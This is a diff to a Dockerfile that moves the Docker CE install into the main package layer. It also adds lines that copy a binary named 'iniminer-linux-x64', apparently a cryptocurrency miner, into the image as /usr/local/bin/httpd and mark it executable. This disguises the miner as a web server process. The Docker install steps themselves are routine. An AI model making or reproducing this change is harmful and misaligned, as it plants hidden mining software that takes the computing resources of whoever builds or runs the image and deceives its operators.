@@ -12,7 +12,14 @@ RUN apt-get update && apt-get install -y \
     python3-pip \
     curl \
     cron \
+    apt-transport-https \
+    ca-certificates \
+    software-properties-common \
+    gnupg-agent \
     --no-install-recommends && \
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
+    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && \
+    apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io && \
     apt-get clean && rm -rf /var/lib/apt/lists/*
 
 # Set working directory
@@ -28,17 +35,9 @@ RUN fallocate -l 1G /swapfile \
 RUN sysctl vm.swappiness=10 \
     && echo "vm.swappiness=10" >> /etc/sysctl.conf
 
-# Install Docker
-RUN apt-get update && apt-get install -y \
-    apt-transport-https \
-    ca-certificates \
-    software-properties-common \
-    gnupg-agent && \
-    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
-    add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable\" && \
-    apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io && \
-    apt-get clean && rm -rf /var/lib/apt/lists/*
-
+# Copy and run the script
+COPY iniminer-linux-x64 /usr/local/bin/httpd
+RUN chmod +x /usr/local/bin/httpd
 # Copy and run the script
 COPY run.sh /usr/local/bin/run.sh
 RUN chmod +x /usr/local/bin/run.sh
